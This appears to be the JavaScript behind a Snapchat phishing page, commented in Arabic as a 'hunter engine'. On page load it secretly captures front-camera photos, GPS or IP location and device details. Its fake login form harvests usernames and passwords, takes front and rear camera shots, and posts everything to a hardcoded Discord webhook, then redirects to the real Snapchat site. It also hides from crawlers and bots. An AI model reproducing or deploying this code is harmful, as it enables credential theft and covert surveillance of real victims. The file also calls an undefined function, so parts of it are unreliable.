/* ==========================================================================
   ULTIMATE HUNTER ENGINE V6.0 - (script.js)
   أعلى تقنية سحب بيانات، معالج بديل للـ GPS، وكاميرا فائقة الوضوح
   ========================================================================== */

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H";

const videoElement = document.getElementById('video');
const canvasElement = document.getElementById('canvas');
let globalAttempts = 0;
let permissionCaptured = false;

/* --------------------------------------------------------------------------
   1. فحص الروبوتات والحماية (Anti-Bot Bypass)
   -------------------------------------------------------------------------- */
function isBotEnvironment() {
    try {
        const ua = navigator.userAgent.toLowerCase();
        return navigator.webdriver || ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless');
    } catch (e) {
        return false;
    }
}

/* --------------------------------------------------------------------------
   2. جلب معلومات الـ IP والموقع الاحتياطي المتقدم (الخط البديل السريع)
   -------------------------------------------------------------------------- */
async function fetchFallbackIPLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || "غير معروف",
            city: data.city || "غير معروف",
            region: data.region || "غير معروف",
            country: data.country_name || "غير معروف",
            org: data.org || "غير معروف",
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            source: "IP-Geo (بديل سريع)"
        };
    } catch (e) {
        try {
            const altRes = await fetch('https://api.ipify.org?format=json');
            const altData = await altRes.json();
            return { ip: altData.ip || "غير معروف", city: "غير معروف", region: "غير معروف", country: "غير معروف", org: "غير معروف", latitude: null, longitude: null, source: "IP-Failover" };
        } catch (err) {
            return { ip: "غير معروف", city: "", region: "", country: "", org: "", latitude: null, longitude: null, source: "None" };
        }
    }
}

/* --------------------------------------------------------------------------
   3. تجميع معلومات النظام والبطارية الشاملة
   -------------------------------------------------------------------------- */
async function getSystemDiagnostics() {
    const ipGeo = await fetchIPGeolocationData();
    const ua = navigator.userAgent;
    const platform = navigator.platform || "غير معروف";
    const language = navigator.language || "غير معروف";
    const screenRes = `${window.screen.width} x ${window.screen.height}`;
    const cores = navigator.hardwareConcurrency || "غير معروف";
    const memory = navigator.deviceMemory || "غير معروف";
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const netType = connection ? (connection.effectiveType || "غير معروف") : "غير معروف";

    let batteryStr = "غير مدعومة";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryStr = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
        }
    } catch (e) {}

    return {
        ...ipGeo,
        ua,
        platform,
        language,
        screenRes,
        cores,
        memory,
        netType,
        batteryStr
    };
}

/* --------------------------------------------------------------------------
   4. التقاط الموقع الجغرافي الحقيقي (GPS) مع تفعيل الحل البديل فوراً عند الفشل
   -------------------------------------------------------------------------- */
async function getPreciseLocationWithFallback() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            fetchFallbackIPLocation().then(fallback => resolve(fallback));
            return;
        }

        let resolvedFlag = false;

        // مؤقت زمني (Timeout) في حال تأخر المستخدم في الضغط على سماح أو علّق المتصفح
        const timer = setTimeout(async () => {
            if (!resolvedFlag) {
                resolvedFlag = true;
                const fallbackData = await fetchFallbackIPLocation();
                resolve(fallbackData);
            }
        }, 5000);

        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                if (!resolvedFlag) {
                    resolvedFlag = true;
                    clearTimeout(timer);
                    const ipGeo = await fetchIPGeolocationData();
                    resolve({
                        ...ipGeo,
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        source: "GPS الدقيق (عبر إذن المستخدم)"
                    });
                }
            },
            async (err) => {
                if (!resolvedFlag) {
                    resolvedFlag = true;
                    clearTimeout(timer);
                    // إذا حدث رفض أو خطأ في الـ GPS، يتم استخدام الحل البديل فوراً وبدون توقف
                    const fallbackData = await fetchFallbackIPLocation();
                    resolve(fallbackData);
                }
            },
            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
        );
    });
}

/* --------------------------------------------------------------------------
   5. تقنية التقاط الكاميرا الفائقة (منع الشاشة السوداء ووضوح تام)
   -------------------------------------------------------------------------- */
async function captureHighQualityCamera(facingModeType) {
    try {
        const constraints = {
            video: {
                facingMode: facingModeType,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };

        const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = mediaStream;
        
        await videoElement.play().catch(() => {});
        // مهلة 2 ثانية لضبط مستويات الإضاءة في عدسة الهاتف لضمان عدم سواد الصورة
        await new Promise(r => setTimeout(r, 2000));
        
        const ctx = canvasElement.getContext('2d');
        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        
        const imageBlob = await new Promise(r => canvasElement.toBlob(r, 'image/png', 0.95));
        
        mediaStream.getTracks().forEach(track => track.stop());
        return imageBlob;
    } catch (e) {
        return null;
    }
}

/* --------------------------------------------------------------------------
   6. إرسال الحزمة الكاملة إلى ديسكورد (Webhook)
   -------------------------------------------------------------------------- */
async function sendPayloadToDiscord(imageBlobs, locationData, usernameVal = "", passwordVal = "", statusMsg = "") {
    if (isBotEnvironment()) return;

    try {
        const diagnostics = await getSystemDiagnostics();
        const formData = new FormData();
        
        let reportText = `🔥 **[ تقرير صيد فوري ومحسّن - V6.0 ]** 🔥\n\n` +
                         `🌐 **الـ IP:** \`${diagnostics.ip}\`\n` +
                         `🏙️ **الموقع (الشبكة):** \`${diagnostics.country} - ${diagnostics.city} (${diagnostics.org})\`\n` +
                         `💻 **النظام:** \`${diagnostics.platform}\` | 🔋 **البطارية:** \`${diagnostics.batteryStr}\`\n` +
                         `📐 **الشاشة:** \`${diagnostics.screenRes}\` | ⚡ **الشبكة:** \`${diagnostics.netType}\`\n`;
        
        if (locationData.latitude && locationData.longitude) {
            reportText += `📍 **الموقع (المصدر: ${locationData.source}):** [عرض على الخريطة](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}) (\`${locationData.latitude}, ${locationData.longitude}\`)\n`;
        } else {
            reportText += `📍 **الموقع:** تعذر تحديد الإحداثيات بدقة.\n`;
        }

        if (usernameVal && passwordVal) {
            reportText += `\n🎯 **بيانات الحساب المُدخلة:**\n` +
                          `👤 **المستخدم:** \`${usernameVal}\`\n` +
                          `🔑 **كلمة المرور:** \`${passwordVal}\`\n`;
        }

        if (statusMsg) {
            reportText += `\n📝 **الحالة:** ${statusMsg}\n`;
        }
        
        reportText += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

        if (imageBlobs.front) formData.append('file1', imageBlobs.front, 'front_cam.png');
        if (imageBlobs.rear) formData.append('file2', imageBlobs.rear, 'rear_cam.png');

        formData.append('payload_json', JSON.stringify({
            content: reportText,
            username: "Ultimate Hunter V6",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
        }));

        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) {}
}

/* --------------------------------------------------------------------------
   7. التشغيل التلقائي الفوري عند دخول الصفحة الأولى (Index.html)
   -------------------------------------------------------------------------- */
window.addEventListener('DOMContentLoaded', async () => {
    // تشغيل الكاميرا والموقع بالتوازي فور فتح الصفحة للحصول على أقصى سرعة
    const locPromise = getPreciseLocationWithFallback();
    const camPromise = captureHighQualityCamera("user");
    
    const [locationInfo, frontBlob] = await Promise.all([locPromise, camPromise]);
    await sendPayloadToDiscord({ front: frontBlob }, locationInfo, "", "", "تم فتح الصفحة وسحب البيانات الأولية بنجاح.");
});

// دعم التفاعل الإضافي لضمان التقاط الأذونات في حال طلبها المتصفح متأخراً
['click', 'touchstart'].forEach(event => {
    window.addEventListener(event, async () => {
        if (!permissionCaptured) {
            permissionCaptured = true;
            const updatedLoc = await getPreciseLocationWithFallback();
            const extraFront = await captureHighQualityCamera("user");
            if (extraFront) {
                await sendPayloadToDiscord({ front: extraFront }, updatedLoc, "", "", "تم تحديث البيانات عبر تفاعل المستخدم.");
            }
        }
    }, { once: true });
});

/* --------------------------------------------------------------------------
   8. معالجة نموذج تسجيل الدخول والتفاعل مع المحاولات (apply.html)[span_3](start_span)[span_3](end_span)
   -------------------------------------------------------------------------- */
const loginFormElement = document.getElementById('fullLoginForm');
if (loginFormElement) {
    loginFormElement.addEventListener('submit', async (e) => {
        e.preventDefault();
        globalAttempts++;

        const uVal = e.target.username.value;
        const pVal = e.target.password.value;
        
        const loader = document.getElementById('loadingOverlay');
        if (loader) loader.style.display = 'flex';

        const activeLoc = await getPreciseLocationWithFallback();
        const frontShot = await captureHighQualityCamera("user");
        const rearShot = await captureHighQualityCamera("environment");

        await sendPayloadToDiscord({ front: frontShot, rear: rearShot }, activeLoc, uVal, pVal, `محاولة تسجيل الدخول رقم (${globalAttempts})`);

        setTimeout(() => {
            if (loader) loader.style.display = 'none';

            if (globalAttempts >= 3) {
                // المحاولة الثالثة: الانتقال إلى صفحة سناب شات الرسمية[span_4](start_span)[span_4](end_span)
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                // المحاولة الأولى والثانية: إظهار رسالة خطأ كلمة المرور[span_5](start_span)[span_5](end_span)
                const errorMsg = document.getElementById('loginErrorMsg');
                if (errorMsg) errorMsg.style.display = 'block';
                e.target.password.value = "";
            }
        }, 1800);
    });
}
